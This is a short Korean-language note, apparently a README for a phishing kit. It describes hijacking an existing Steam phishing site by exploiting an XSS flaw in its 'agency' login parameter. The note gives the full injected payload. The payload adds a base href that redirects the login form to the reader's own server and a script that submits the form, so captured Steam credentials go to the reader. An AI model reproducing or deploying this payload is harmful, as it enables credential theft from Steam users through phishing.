중국인 누군가가 만들어 둔 STEAM 피싱사이트에 XSS 취약점을 사용하여 내 피싱사이트로 이용해보자!
============================================================================================
1.DB파일은 초기화 완료. superuser은 사용자가 만들어 사용하자!
2.
https://steampoweroel.me/login?
agency="><base href="
http://본인의서버URL/form/login
"><script>function login(){document.getElementById('form').submit();}</script><br"
을 사용하여 적용시키면 끝.
3. https://steampoweroel.me는 피싱사이트! 스팀의 공식 사이트는 .com이다.
